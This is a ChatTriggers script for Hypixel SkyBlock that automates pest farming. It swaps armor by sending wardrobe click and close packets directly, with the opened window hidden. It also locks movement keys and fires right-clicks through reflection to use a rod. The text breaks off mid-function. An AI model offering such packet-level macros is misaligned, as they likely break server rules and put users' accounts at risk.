//  ----    To Do   ----    //
/*  
    -   World Check (only in garden)
*/
//  ----            ----    //
import PogObject from "../PogData";
import RenderLibV3 from "./Utils/Render";
import { equipmentSwap } from "./Utils/EqSwap";

// Version
let version = "1.0.26"

const S2DPacketOpenWindow = Java.type("net.minecraft.network.play.server.S2DPacketOpenWindow")
const C0EPacketClickWindow = Java.type("net.minecraft.network.play.client.C0EPacketClickWindow")
const C0DPacketCloseWindow = Java.type("net.minecraft.network.play.client.C0DPacketCloseWindow")
const S2EPacketCloseWindow = Java.type("net.minecraft.network.play.server.S2EPacketCloseWindow")
const KeyBinding = Java.type("net.minecraft.client.settings.KeyBinding")

let dataObject = new PogObject("pest", {
    "pestCooldown": 135,
    "posX1": 0,
    "posY1": 0,
    "posZ1": 0,

    "posX2": 0,
    "posY2": 0,
    "posZ2": 0,

    "farmYpos": 0,

    "barnToggle": true,
    "wardrobedelay": 4,
    "wdtimer": 5,
    "overlayLocX": 500,
    "overlayLocY": 40,
    "RodSwapBackDelay": 4,
    "RodSwapToggle": false,
    "eqSwapToggle": false
}, "data.json");

// Main Armor Swap
let cwid = -1
let awaitingWardrobe = false
let index;
// Debug
let debugMode = false;
// Render Blue Box
let currentPosX = null;
let currentPosY = null;
let currentPosZ = null;
// SwapStates
let BiohazardCooldown = 3;
let FermentoCooldown = 3;
let triggerCooldown = 0
let canBarn = true;
// Prefix
let prefix = "§l§8[§dPest Info§l§8]§r"
// Upon Loading Write in chat
chat(prefix + ' For Information do §b/help pestinfo')
chat(prefix + ' In case the overlay doesnt show, §b/ct reload')
chat(prefix + ' If first time launching this. §bset Pestcooldown')
chat(prefix + ' §cNOTE§r §6Biohazard§r Slot 1, §aFermento§r Slot 2')

register("chat", (event) => {
    const message = ChatLib.removeFormatting(event.message)
    if ((message.includes("EWW!") || message.includes("GROSS!") || message.includes("YUCK!")) && message.includes("Pests") && message.includes("Plot")) {
        chat(prefix + " Detected Pests Spawned.")
        triggerCooldown = dataObject.pestCooldown
        WaypointRodSwap = true;
    }
})

function WardrobeToFermento(slotclick, whatArmor) {
    setTimeout(() => {
        if (slotclick == 37 && wearingBiohazard) {
            if (ContainerValid) {
                index = 37
                setNoWalk(10)
                chat("&d" + whatArmor)
                awaitingWardrobe = true
                clickSlot.register()
                overlay.register()
                ChatLib.command("wardrobe")
            }
        }
    }, 1000);
}
function WardrobeToHazard(slotclick, whatArmor) {
    setTimeout(() => {
        if (slotclick == 36 && wearingFermento) {
            if (ContainerValid) {
                index = 36
                setNoWalk(10)
                chat("&d" + whatArmor)
                awaitingWardrobe = true
                clickSlot.register()
                overlay.register()
                wardrobeStuck = dataObject.wdtimer
                wardrobeStuckBool = true
                ChatLib.command("wardrobe")
            }
            if (!ContainerValid) { triggerCooldown = 5 }
        }
    }, 1000);
}

let WardrobeUnregisterClickslot
let WardrobeUnregisterOverlay;

const clickSlot = register("packetReceived", (packet, event) => {
    if (!awaitingWardrobe) {
        chat(prefix + " &4Container:&r " + CurrentContainer)
        return
    }
    const title = ChatLib.removeFormatting(packet.func_179840_c().func_150254_d());
    if (!title.includes("Wardrobe")) {
        chat(prefix + " &4Titel:&r " + title)
        return
    }
    awaitingWardrobe = false
    cwid = packet.func_148901_c()
    cancel(event)
    chat(prefix + " &bcwid is:&r " + cwid)

    setTimeout(() => {
        click(index)
        chat(prefix + " " + index + " &aClicked.")
    }, (50 * parseInt(dataObject.wardrobedelay)));

    setTimeout(() => {
        clickSlot.unregister()
        chat(prefix + " &bClickslot, unregister clickslot")
    }, (50 * WardrobeUnregisterClickslot));

    setTimeout(() => {
        overlay.unregister()
        chat(prefix + " &bClickslot, unregister overlay")
    }, (50 * WardrobeUnregisterOverlay));

    setTimeout(() => {
        Client.sendPacket(new C0DPacketCloseWindow(cwid));
        chat(prefix + " &cClosed Window.")
    }, 110 + (50 * parseInt(dataObject.wardrobedelay)));
    wardrobeStuckBool = false
    wardrobeStuck = dataObject.wdtimer
}).setFilteredClass(S2DPacketOpenWindow).unregister()

function click(slot) {
    if (cwid === -1) return false;
    Client.sendPacket(new C0EPacketClickWindow(cwid, slot, 0, 0, null, 0))
    return true;
}

//  ----    Text Render for Wardrobe UI ----  //
const overlay = register("renderOverlay", () => {
    if (awaitingWardrobe) {
        let text = "Changing Wardrobe"
        let scale = 1.5
        Renderer.scale(scale)
        Renderer.drawStringWithShadow(text, (Renderer.screen.getWidth() / scale - Renderer.getStringWidth(text)) / 2, Renderer.screen.getHeight() / scale / 2 + 16)
    }
}).unregister()

//  ----    Check each step for available functions   ----  //
register("step", () => {
    PlayerSwapArmor();
    atBarn();
    setRodPoint();
    WithinBoundaries();
    currentPosX = Player.getX()
    currentPosY = Player.getY()
    currentPosZ = Player.getZ()

    WardrobeUnregisterClickslot = 1 + parseInt(dataObject.wardrobedelay)
    WardrobeUnregisterOverlay = 2 + parseInt(dataObject.wardrobedelay)
})

//  ----    Swap Armor   ----  //
function PlayerSwapArmor() {
    if (dataObject.posX1 < dataObject.posX2 && dataObject.posZ1 < dataObject.posZ2) {
        if (currentPosX > dataObject.posX1 && currentPosX < dataObject.posX2 && currentPosZ > dataObject.posZ1 && currentPosZ < dataObject.posZ2) {
            if (currentPosY < (dataObject.farmYpos + 0.02)) {
                if (FermentoCooldown == 0 && wearingBiohazard && triggerCooldown > 10 && ContainerValid) {
                    FermentoCooldown = 10
                    WardrobeToFermento(37, "Swap To Fermento")
                    canBarn = false;
                    wearingBiohazard = false;
                    image = new Image("fermento.png", "./assets")
                    wentToBarn = false
                    if (dataObject.eqSwapToggle) {
                        setTimeout(() => {
                            setNoWalk(10);
                            swappingEq();
                        }, 5000);
                    }
                }

                if (BiohazardCooldown == 0 && wearingFermento && triggerCooldown <= 10 && ContainerValid) {
                    BiohazardCooldown = 10
                    WardrobeToHazard(36, "Swap To Biohazard")
                    wearingFermento = false;
                    canBarn = true;
                    image = new Image("hazard.png", "./assets")
                    if (!wentToBarn) {
                        if (dataObject.eqSwapToggle) {
                            setTimeout(() => {
                                setNoWalk(10);
                                swappingEq();
                            }, 5000);
                        }
                    }
                }
            }
        }
    }
    if (dataObject.posX1 < dataObject.posX2 && dataObject.posZ1 > dataObject.posZ2) {
        if (currentPosX > dataObject.posX1 && currentPosX < dataObject.posX2 && currentPosZ < dataObject.posZ1 && currentPosZ > dataObject.posZ2) {
            if (currentPosY < (dataObject.farmYpos + 0.02)) {
                if (FermentoCooldown == 0 && wearingBiohazard && triggerCooldown > 10 && ContainerValid) {
                    FermentoCooldown = 10
                    WardrobeToFermento(37, "Swap To Fermento")
                    canBarn = false;
                    wearingBiohazard = false;
                    image = new Image("fermento.png", "./assets")
                    wentToBarn = false
                    if (dataObject.eqSwapToggle) {
                        setTimeout(() => {
                            setNoWalk(10);
                            swappingEq();
                        }, 5000);
                    }
                }

                if (BiohazardCooldown == 0 && wearingFermento && triggerCooldown <= 10 && ContainerValid) {
                    BiohazardCooldown = 10
                    WardrobeToHazard(36, "Swap To Biohazard")
                    wearingFermento = false;
                    canBarn = true;
                    image = new Image("hazard.png", "./assets")
                    if (!wentToBarn) {
                        if (dataObject.eqSwapToggle) {
                            setTimeout(() => {
                                setNoWalk(10);
                                swappingEq();
                            }, 5000);
                        }
                    }
                }
            }
        }
    }
    if (dataObject.posX1 > dataObject.posX2 && dataObject.posZ1 > dataObject.posZ2) {
        if (currentPosX < dataObject.posX1 && currentPosX > dataObject.posX2 && currentPosZ < dataObject.posZ1 && currentPosZ > dataObject.posZ2) {
            if (currentPosY < (dataObject.farmYpos + 0.02)) {
                if (FermentoCooldown == 0 && wearingBiohazard && triggerCooldown > 10 && ContainerValid) {
                    FermentoCooldown = 10
                    WardrobeToFermento(37, "Swap To Fermento")
                    canBarn = false;
                    wearingBiohazard = false;
                    image = new Image("fermento.png", "./assets")
                    wentToBarn = false
                    if (dataObject.eqSwapToggle) {
                        setTimeout(() => {
                            setNoWalk(10);
                            swappingEq();
                        }, 5000);
                    }
                }

                if (BiohazardCooldown == 0 && wearingFermento && triggerCooldown <= 10 && ContainerValid) {
                    BiohazardCooldown = 10
                    WardrobeToHazard(36, "Swap To Biohazard")
                    wearingFermento = false;
                    canBarn = true;
                    image = new Image("hazard.png", "./assets")
                    if (!wentToBarn) {
                        if (dataObject.eqSwapToggle) {
                            setTimeout(() => {
                                setNoWalk(10);
                                swappingEq();
                            }, 5000);
                        }
                    }
                }
            }
        }
    }
    if (dataObject.posX1 > dataObject.posX2 && dataObject.posZ1 < dataObject.posZ2) {
        if (currentPosX < dataObject.posX1 && currentPosX > dataObject.posX2 && currentPosZ > dataObject.posZ1 && currentPosZ < dataObject.posZ2) {
            if (currentPosY < (dataObject.farmYpos + 0.02)) {
                if (FermentoCooldown == 0 && wearingBiohazard && triggerCooldown > 10 && ContainerValid) {
                    FermentoCooldown = 10
                    WardrobeToFermento(37, "Swap To Fermento")
                    canBarn = false;
                    wearingBiohazard = false;
                    image = new Image("fermento.png", "./assets")
                    wentToBarn = false
                    if (dataObject.eqSwapToggle) {
                        setTimeout(() => {
                            setNoWalk(10);
                            swappingEq();
                        }, 5000);
                    }
                }

                if (BiohazardCooldown == 0 && wearingFermento && triggerCooldown <= 10 && ContainerValid) {
                    BiohazardCooldown = 10
                    WardrobeToHazard(36, "Swap To Biohazard")
                    wearingFermento = false;
                    canBarn = true;
                    image = new Image("hazard.png", "./assets")
                    if (!wentToBarn) {
                        if (dataObject.eqSwapToggle) {
                            setTimeout(() => {
                                setNoWalk(10);
                                swappingEq();
                            }, 5000);
                        }
                    }
                }
            }
        }
    }
}

function atBarn() {
    if (dataObject.barnToggle) {
        if (canBarn && !wearingFermento) {
            if (currentPosX > -32 && currentPosX < 35 && currentPosZ < -4 && currentPosZ > -46 && currentPosY < 77) {
                index = 37
                Client.scheduleTask(1, () => { WardrobeToFermento(37, "Swapping To Fermento") })
                canBarn = false;
                image = new Image("fermento.png", "./assets")
                if (!wentToBarn && dataObject.eqSwapToggle) {
                    wentToBarn = true
                }
            }
        }
    }
}

//  ----    Packet Stuff   --- //
register("packetSent", () => {
    cwid = -1
}).setFilteredClass(C0DPacketCloseWindow)

register("packetReceived", () => {
    cwid = -1
}).setFilteredClass(S2EPacketCloseWindow)

//  ----    Cooldown Ticker   ----  //
register("step", () => {
    if (triggerCooldown != 0) { triggerCooldown-- }
    if (BiohazardCooldown != 0) { BiohazardCooldown-- }
    if (FermentoCooldown != 0) { FermentoCooldown-- }
    if (RodCooldown != 0) { RodCooldown-- }
    if (RodGrabLocationCooldown != 0) { RodGrabLocationCooldown-- }
}).setDelay(1)

//  ----    Image Overlay   --- //
let image
let imageWidth = 300
let imageHeight = 300
let scaling = 0.1

try {
    image = new Image("fermento.png", "./assets")
    imageWidth = image.getTextureWidth()
    imageHeight = image.getTextureHeight()
} catch (e) {
    chat(":3")
}

register("RenderOverlay", () => {
    let imageX = dataObject.overlayLocX
    let imageY = dataObject.overlayLocY
    let imageW = imageWidth * scaling
    let imageH = imageHeight * scaling
    image.draw(imageX, imageY, imageW, imageH)
})

const LMenuKeyBind = Client.getKeyBindFromKey(Keyboard.KEY_LMENU, "Left Alt Key");

const LeftKeyBind = Client.getKeyBindFromKey(203, "Left Key");
const RightKeyBind = Client.getKeyBindFromKey(205, "Right Key");
const UpKeyBind = Client.getKeyBindFromKey(200, "Up Key");
const DownKeyBind = Client.getKeyBindFromKey(208, "Down Key");


register("tick", () => {
    noWalk()
    display.setRenderLoc(dataObject.overlayLocX + 30, dataObject.overlayLocY + 7)

    if (!LMenuKeyBind.isKeyDown()) {
        if (LeftKeyBind.isKeyDown()) {
            dataObject.overlayLocX = dataObject.overlayLocX - 5
            dataObject.save()
        }
        if (RightKeyBind.isKeyDown()) {
            dataObject.overlayLocX = dataObject.overlayLocX + 5
            dataObject.save()
        }
        if (UpKeyBind.isKeyDown()) {
            dataObject.overlayLocY = dataObject.overlayLocY - 5
            dataObject.save()
        }
        if (DownKeyBind.isKeyDown()) {
            dataObject.overlayLocY = dataObject.overlayLocY + 5
            dataObject.save()
        }
    }

    if (LMenuKeyBind.isKeyDown()) {
        if (LeftKeyBind.isKeyDown()) {
            dataObject.overlayLocX = dataObject.overlayLocX - 1
            dataObject.save()
        }
        if (RightKeyBind.isKeyDown()) {
            dataObject.overlayLocX = dataObject.overlayLocX + 1
            dataObject.save()
        }
        if (UpKeyBind.isKeyDown()) {
            dataObject.overlayLocY = dataObject.overlayLocY - 1
            dataObject.save()
        }
        if (DownKeyBind.isKeyDown()) {
            dataObject.overlayLocY = dataObject.overlayLocY + 1
            dataObject.save()
        }
    }
})

register("tick", pestOverlayInfo);

const display = new Display();

function pestOverlayInfo() {
    display.setLine(0, "&l&8[&dPest Info&l&8] &b" + version);
    display.setLine(1, "§l§bPest Cooldown§r: " + triggerCooldown);
}

register("renderWorld", () => {

    if (currentRenderLocation) {
        RenderLoc(dataObject.posX1, dataObject.posY1, dataObject.posZ1);
    }
});
let currentRenderLocation = false;

//  ----    Debug/Waypoint   --- //
function worldRender() {
    if (currentRenderLocation) {
        currentRenderLocation = false;
        chat("&l&cDisabled&r The Debug Mode")
        return
    }
    if (!currentRenderLocation) {
        currentRenderLocation = true;
        chat("\n" + prefix + " §bThis will show 3 different colored boxes\n§cRed Box§r This is plotpos2\n§aGreen Box§r This is plotpos1\n§9Blue Box§r Within this box you swap to biohazard")
        return
    }
}

function RenderLoc() {
    RenderLibV3.drawEspBoxV3(dataObject.posX1, (dataObject.farmYpos + 0.03), dataObject.posZ1, dataObject.posX2, (dataObject.farmYpos + 0.02), dataObject.posZ2, 10, 1, 0, 0, 1, true, 4)
    RenderLibV3.drawEspBoxV3(dataObject.posX1, dataObject.farmYpos, dataObject.posZ1, dataObject.posX2, dataObject.farmYpos + 0.02, dataObject.posZ2, 0.02, 0, 0, 1, 1, true, 3)
    // ROD V
    RenderLibV3.drawInnerEspBoxV3(RodBlockX, RodBlockY, RodBlockZ, 1, 1, 1, 0.4, 1, 0.8, 0.25, true);
    RenderLibV3.drawInnerEspBoxV3(RodBlockX, RodBlockY, RodBlockZ, 5, 5, 5, 5, 0.46, 0.84, 0.15, true);
}


//  ----    No Walking   --- //
let stopWalk = false

function setNoWalk(tickDuration) {
    stopWalk = true
    setTimeout(() => {
        stopWalk = false
    }, 50 * tickDuration);
}

function noWalk() {
    if (stopWalk) {
        Client.scheduleTask(() => { KeyBinding.func_74510_a(Client.getMinecraft().field_71474_y.field_74351_w.func_151463_i(), false) })
        Client.scheduleTask(() => { KeyBinding.func_74510_a(Client.getMinecraft().field_71474_y.field_74370_x.func_151463_i(), false) })
        Client.scheduleTask(() => { KeyBinding.func_74510_a(Client.getMinecraft().field_71474_y.field_74314_A.func_151463_i(), false) })
        Client.scheduleTask(() => { KeyBinding.func_74510_a(Client.getMinecraft().field_71474_y.field_74366_z.func_151463_i(), false) })
        Client.scheduleTask(() => { KeyBinding.func_74510_a(Client.getMinecraft().field_71474_y.field_74368_y.func_151463_i(), false) })
    }
}
//  ----    Chat Message   --- //
function chat(message) {
    ChatLib.simulateChat(message)
}
//  ----    Commands   --- //

register("command", () => {
    dataObject.posX1 = Player.getX()
    dataObject.posY1 = Player.getY()
    dataObject.posZ1 = Player.getZ()
    dataObject.save();
    chat("§l§8[§dPlotPos1§l§8]§r X: " + dataObject.posX1.toFixed(2) + " Y: " + dataObject.posY1.toFixed(2) + " Z: " + dataObject.posZ1.toFixed(2))
}).setName("plotpos1")


register("command", () => {
    dataObject.posX2 = Player.getX()
    dataObject.posY2 = Player.getY()
    dataObject.posZ2 = Player.getZ()
    dataObject.save();
    chat("§l§8[§dPlotPos2§l§8]§r X: " + dataObject.posX2.toFixed(2) + " Y: " + dataObject.posY2.toFixed(2) + " Z: " + dataObject.posZ2.toFixed(2))
}).setName("plotpos2")

register("command", () => {
    dataObject.farmYpos = (Player.getY())
    dataObject.save();
    chat("§l§8[§dFarmPos§l§8]§r: " + dataObject.farmYpos)
}).setName("pestfarmpos").setAliases("farmpos", "farmPos", "pestFarmPos", "pestFarmpos")

register("command", () => {
    worldRender()
    debugMode = !debugMode
}).setName("pestdebuglocation").setAliases("pestDebug", "pestdebug", "debuglocation", "debugLocation", "DebugLocation")

register("command", (cooldownNumber) => {
    if (cooldownNumber == undefined) { chat(dataObject.pestCooldown) }

    if (cooldownNumber !== undefined) {
        dataObject.pestCooldown = cooldownNumber
        chat("&dPest Cooldown set to:&r " + dataObject.pestCooldown)
        dataObject.save();
    }
}).setName("pestcooldown")

register("command", (callHelp, CallInfo) => {
    if (callHelp == "pestinfo" || callHelp == "pestInfo") {
        if (CallInfo !== undefined) {
            switch (CallInfo) {
                case "plotpos1":
                    chat("§b➤ /plotpos1&r\nis to set the first position of farm border")
                    break;
                case "plotpos2":
                    chat("§b➤ /plotpos2&r\nis to set the second position of farm border")
                    break;
                case "pestfarmpos":
                    chat("§b➤ /pestfarmpos&r\nis used while standing on your farm path")
                    break;
                case "pestcooldown":
                    chat("§b➤ /pestcooldown&r\nis to set your pest spawn cooldown §cIn SECONDS!")
                    break;
                case "pestdebuglocation":
                    chat("§b➤ /pestdebuglocation&r\nis to render pos1 (green) pos2 (red) and farmpos(blue)")
                    break;
                case "moveoverlay":
                    chat("§b➤ moveOverlay&r\nyou can move the overlay with arrow, hold Left ALT while using arrows makes it move 1px")
                    break;
                case "peststate":
                    chat("§b➤ /peststate&r\nusage of this is /peststate fermento/biohazard. withfermento you can use timer duration\nExample:/peststate fermento 50, this will put a 50 sec cooldown")
                    break;
                case "togglebarn":
                    chat("§b➤ /togglebarn&r\nthis is to a toggle for enabling/disabling swapping to fermento armor when entering barn area")
                    break;
                case "wardrobedelay":
                    chat("§b➤ /wardrobedelay&r\nset a delay between wardrobe being opened, clicked and closed. only between 1-7 allowed")
                    break;
                case "wdtimer":
                    chat("§b➤ /WdTimer&r\nset a countdown before the script auto ct reloads for possible stuck script")
                    break;
            }
            return
        }
        if (CallInfo == undefined) {
            chat("\n" + prefix + " §l§cNOTE§r §5Plotpos1 and 2§r need to be §n§cdiagonal across the Crop you are farming!!!§r\n")
            chat(prefix + " Available Commands\n§b➤ Description: /help pestinfo [command]\n§b➤ /plotpos1\n§b➤ /plotpos2\n§b➤ /pestfarmpos\n§b➤ /pestcooldown\n§b➤ /pestdebuglocation\n§b➤ /peststate\n§b➤ /togglebarn\n§b➤ /wardrobedelay\n§b➤ /wdtimer\n§b➤ moveoverlay")
        }
    }
}).setName("help")

register("command", (state, timerDuration) => {
    if (state == undefined) {
        chat(prefix + " You did not clarify what state you are at.\nfermento or biohazard?")
    }
    if (state !== undefined) {
        if (state == "fermento" || state == "Fermento") {
            if (timerDuration == undefined) {
                chat("Enabling to change to Fermento when farming")
                return
            }
            if (timerDuration !== undefined) {
                chat("Enabling to change to Fermento when farming with " + timerDuration + " on cooldown")
                triggerCooldown = timerDuration
                return
            }
        }

        if (state == "biohazard" || state == "Biohazard") {
            chat("Enabled, change to Biohazard at farm pos Y level")
            triggerCooldown = 0
            if (timerDuration <= 5) {
                chat("adjusted cooldown to " + timerDuration)
                triggerCooldown = timerDuration
            }
            if (timerDuration > 5) {
                chat("you can't have the timer above 5 seconds with biohazard")
            }
            return
        }
    }
}).setName("peststate").setAliases("pestState")


register("command", () => {
    dataObject.barnToggle = !dataObject.barnToggle
    dataObject.save()
    chat("&dSwap At Barn:&r " + dataObject.barnToggle)
}).setName("togglebarn").setAliases("toggleBarn")

register("command", (setDelay) => {
    if (setDelay == undefined) { chat(prefix + " input a number\nCurrent is &b" + dataObject.wardrobedelay + "&r Tick(s)") }
    if (setDelay !== undefined) {
        if (setDelay < 1 || setDelay > 7) { chat("given input " + setDelay + " is below 1, make sure its higher\nyou can only go between 1 and 7") }
        if (setDelay >= 1 && setDelay <= 7) {
            dataObject.wardrobedelay = setDelay
            chat("&dWardrobe Delay set to:&r " + dataObject.wardrobedelay)
            dataObject.save()
        }
    }
}).setName("wardrobedelay").setAliases("wardrobeDelay")

//  ----    Check Worn Armor   --- //
let wearingArmor = []
let wearingFermento = false;
let wearingBiohazard = false;

register("step", () => {
    wornArmor()
    armorstate()
    if (!armordebugmode) {
        cleararry();
    }
}).setFps(60)

function wornArmor() {
    let helmet = Player.getInventory().getStackInSlot(39);
    if (helmet) {
        if (helmet.getName().includes("Fermento")) {
            if (!wearingArmor.includes(helmet.getName())) {
                wearingArmor.push(helmet.getName())
            }
        }
        if (helmet.getName().includes("Biohazard")) {
            if (!wearingArmor.includes(helmet.getName())) {
                wearingArmor.push(helmet.getName())
            }
        }
    }
    else { if (wearingArmor.length <= 4) wearingArmor.push("empty") }


    let chestplate = Player.getInventory().getStackInSlot(38);
    if (chestplate) {
        if (chestplate.getName().includes("Fermento")) {
            if (!wearingArmor.includes(chestplate.getName())) {
                wearingArmor.push(chestplate.getName())
            }
        }
        if (chestplate.getName().includes("Biohazard")) {
            if (!wearingArmor.includes(chestplate.getName())) {
                wearingArmor.push(chestplate.getName())
            }
        }
    }
    else { if (wearingArmor.length <= 4) wearingArmor.push("empty") }

    let leggings = Player.getInventory().getStackInSlot(37);
    if (leggings) {
        if (leggings.getName().includes("Fermento")) {
            if (!wearingArmor.includes(leggings.getName())) {
                wearingArmor.push(leggings.getName())
            }
        }
        if (leggings.getName().includes("Biohazard")) {
            if (!wearingArmor.includes(leggings.getName())) {
                wearingArmor.push(leggings.getName())
            }
        }
    }
    else { if (wearingArmor.length <= 4) wearingArmor.push("empty") }

    let boots = Player.getInventory().getStackInSlot(36);
    if (boots) {
        if (boots.getName().includes("Fermento")) {
            if (!wearingArmor.includes(boots.getName())) {
                wearingArmor.push(boots.getName())
            }
        }
        if (boots.getName().includes("Biohazard")) {
            if (!wearingArmor.includes(boots.getName())) {
                wearingArmor.push(boots.getName())
            }
        }
        if (boots.getName().includes("Rancher")) {
            if (!wearingArmor.includes(boots.getName())) {
                wearingArmor.push(boots.getName())
            }
        }
    }
    else { if (wearingArmor.length <= 4) wearingArmor.push("empty") }
}

function armorstate() {
    if (wearingArmor[0].includes("Fermento") || wearingArmor[1].includes("Fermento") || wearingArmor[2].includes("Fermento") || wearingArmor[3].includes("Fermento")) {
        if (!wearingFermento) {
            wearingFermento = true
            wearingBiohazard = false
        }
    }
    if (wearingArmor[0].includes("Biohazard") || wearingArmor[1].includes("Biohazard") || wearingArmor[2].includes("Biohazard") || wearingArmor[3].includes("Biohazard")) {
        if (!wearingBiohazard) {
            wearingFermento = false
            wearingBiohazard = true
        }
    }
}

function cleararry() {
    wearingArmor = [];
}

let armordebugmode = false;
register("command", () => {
    armordebugmode = !armordebugmode
    chat("toggled array reset")
}).setName("toggleArrayReset").setAliases("togglearrayreset")

register("command", () => {
    chat("&bArmor Length: &r" + wearingArmor.length)
    chat("&bArmor Array: &r" + wearingArmor.toString())

    chat("&bArmor &aFermento&r: " + wearingFermento)
    chat("&bArmor &6Fermento&r: " + wearingBiohazard)
}).setName("debugArmorSwap").setAliases("debugarmorswap")

//  ----    Container Check   --- //
let ContainerValid = false
let ContainerValids;
register("step", () => {
    let CurrentContainer = Player.getContainer().getName();
    if (CurrentContainer.includes("Wardrobe")) {
        ContainerValid = true
        ContainerValids = "In Wardrobe"
    }
    if (CurrentContainer.includes("container")) {
        ContainerValid = true
        ContainerValids = "Nothing"
    }
    if (!CurrentContainer.includes("Wardrobe") && !CurrentContainer.includes("container")) {
        ContainerValid = false
        ContainerValids = "Random Container"
    }
})

register("chat", (message) => {
    message = ChatLib.removeFormatting(message)
    if (message == "Welcome to Hypixel SkyBlock!") {
        ChatTriggers.reloadCT()
    }
}).setCriteria("${message}")


//  ----    Debug Overlay   --- //
let wardrobeStuck
let wardrobeStuckBool = false;

register("tick", DebugOverlay);
register("tick", () => { display2.setRenderLoc(dataObject.overlayLocX + 30, dataObject.overlayLocY + 27) });
const display2 = new Display();

function DebugOverlay() {
    if (debugMode) {
        display2.setLine(0, "&l§4-=&dPest Debug&l§4=- &b");
        display2.setLine(1, "§l§bWd-Delay§r: " + dataObject.wardrobedelay);
        display2.setLine(2, "§l§bToggleRod§r: " + dataObject.RodSwapToggle);
        display2.setLine(3, "§l§bRodDelay§r: " + dataObject.RodSwapBackDelay);
        display2.setLine(4, "§l§bIn Zone§r: " + BorderZone);
        display2.setLine(5, "§l§bWithin Border§r: " + WithinBorder);
        display2.setLine(6, "§l§bCanSwap§r: " + withinSwapBorder);
        display2.setLine(7, "§l§bToggleEq§r: " + dataObject.eqSwapToggle);
    }
    if (!debugMode) {
        display2.setLine(0, "");
        display2.setLine(1, "");
        display2.setLine(2, "");
        display2.setLine(3, "");
        display2.setLine(4, "");
        display2.setLine(5, "");
        display2.setLine(6, "");
        display2.setLine(7, "");
    }
}

register("step", () => {
    if (wardrobeStuckBool) {
        if (wardrobeStuck != 0) {
            wardrobeStuck--
        }
    }
    if (wardrobeStuck == 0) {
        ChatTriggers.reloadCT()
    }
}).setDelay(1)

register("command", (time) => {
    if (time == undefined) {
        chat(prefix + " your current countdown time is: " + dataObject.wdtimer)

    }
    if (time !== undefined) {
        dataObject.wdtimer = time
        dataObject.save()
        chat(prefix + " Your current countdown time is: " + time)
    }

}).setName("wdtimer").setAliases("WdTimer", "wdTimer")

//  ----    Rod Swap   --- //
const rightClickMethod = Client.getMinecraft().getClass().getDeclaredMethod("func_147121_ag", null)
rightClickMethod.setAccessible(true)
const rightClick = () => rightClickMethod.invoke(Client.getMinecraft(), null)

let currentSlot
let RodSlot
let RClickDelay = 1
let RodCooldown = 0

let RodPositionSet = false
let RodBlockX = 0
let RodBlockY = 5000
let RodBlockZ = 0

let RodPositionSetCooldown = 70

function RodSwap() {
    if (RodCooldown == 0) {
        RodCooldown = 2
    }
    currentSlot = Player.getHeldItemIndex()
    if (currentSlot !== RodSlot) {
        Player.setHeldItemIndex(RodSlot)
        Client.scheduleTask(RClickDelay, () => { rightClick() })
        if (Player.getHeldItemIndex() !== currentSlot) {
            Client.scheduleTask(dataObject.RodSwapBackDelay, () => { Player.setHeldItemIndex(currentSlot) })
            return
        }
        return
    }
    if (currentSlot == RodSlot) {
        Client.scheduleTask(() => { rightClick() })
        if (Player.getHeldItemIndex() !== currentSlot) {
            Player.setHeldItemIndex(currentSlot)
        }
        return
    }
}

register("step", () => {
    RodSlot = Player.getInventory().getItems().findIndex(RodID => RodID?.getID() === 346)
    if (RodPositionSetCooldown != 0) { RodPositionSetCooldown-- }

    if (RodPositionSetCooldown == 0) {
        if (RodPositionSet) {
            RodBlockY = 5000
            RodPositionSet = false
            WaypointRodSwap = true
        }
    }
}).setDelay(1)

register("command", (delayAmount) => {
    if (delayAmount == undefined) {
        chat(prefix + " You need to give a number for delay\nCurrent is: " + dataObject.RodSwapBackDelay)
    }
    if (delayAmount !== undefined) {
        if (delayAmount > 0 && delayAmount <= 25) {
            dataObject.RodSwapBackDelay = delayAmount
            dataObject.save()
            chat(prefix + " Rod Delay is set to: " + delayAmount)
        }
        if (delayAmount <= 0 || delayAmount > 25) {
            chat("you cant do: " + delayAmount)
        }
    }
}).setName("roddelay").setAliases("RodDelay")

register("step", () => {
    let Px = Math.abs(Player.getX())
    let Py = Math.abs(Player.getY())
    let Pz = Math.abs(Player.getZ())

    // calculate distance between block & player
    let distanceX = Math.abs((Math.abs(RodBlockX)) - Px)
    let distanceY = Math.abs((Math.abs(RodBlockY)) - Py)
    let distanceZ = Math.abs((Math.abs(RodBlockZ)) - Pz)

    if (distanceX < 5 && distanceZ < 5 && distanceY < 5 && RodCooldown == 0 && RodPositionSet) {
        RodSwap()
        RodBlockY = 5000
        RodPositionSet = false
        WaypointRodSwap = false
    }
}).setDelay(1)
let WaypointRodSwap = false
let RodGrabLocationCooldown = 0

function setRodPoint() {
    if (dataObject.RodSwapToggle) {
        if (dataObject.posX1 < dataObject.posX2 && dataObject.posZ1 < dataObject.posZ2) {
            if (currentPosX > dataObject.posX1 && currentPosX < dataObject.posX2 && currentPosZ > dataObject.posZ1 && currentPosZ < dataObject.posZ2) {
                if (currentPosY > dataObject.farmYpos + 1 && currentPosY < dataObject.farmYpos + 4 && !RodPositionSet && WaypointRodSwap) {
                    if (RodGrabLocationCooldown == 0) {
                        RodBlockX = Player.getX()
                        RodBlockY = Player.getY()
                        RodBlockZ = Player.getZ()
                        RodPositionSet = true
                        RodGrabLocationCooldown = 20
                        RodCooldown = 10
                        WaypointRodSwap = false
                        RodPositionSetCooldown = 70
                    }
                }
            }
        }
        if (dataObject.posX1 < dataObject.posX2 && dataObject.posZ1 > dataObject.posZ2) {
            if (currentPosX > dataObject.posX1 && currentPosX < dataObject.posX2 && currentPosZ < dataObject.posZ1 && currentPosZ > dataObject.posZ2) {
                if (currentPosY > dataObject.farmYpos + 1 && currentPosY < dataObject.farmYpos + 4 && !RodPositionSet && WaypointRodSwap) {
                    if (RodGrabLocationCooldown == 0) {
                        RodBlockX = Player.getX()
                        RodBlockY = Player.getY()
                        RodBlockZ = Player.getZ()
                        RodPositionSet = true
                        RodGrabLocationCooldown = 20
                        RodCooldown = 10
                        WaypointRodSwap = false
                        RodPositionSetCooldown = 70
                    }
                }
            }
        }
        if (dataObject.posX1 > dataObject.posX2 && dataObject.posZ1 > dataObject.posZ2) {
            if (currentPosX < dataObject.posX1 && currentPosX > dataObject.posX2 && currentPosZ < dataObject.posZ1 && currentPosZ > dataObject.posZ2) {
                if (currentPosY > dataObject.farmYpos + 1 && currentPosY < dataObject.farmYpos + 4 && !RodPositionSet && WaypointRodSwap) {
                    if (RodGrabLocationCooldown == 0) {
                        RodBlockX = Player.getX()
                        RodBlockY = Player.getY()
                        RodBlockZ = Player.getZ()
                        RodPositionSet = true
                        RodGrabLocationCooldown = 20
                        RodCooldown = 10
                        WaypointRodSwap = false
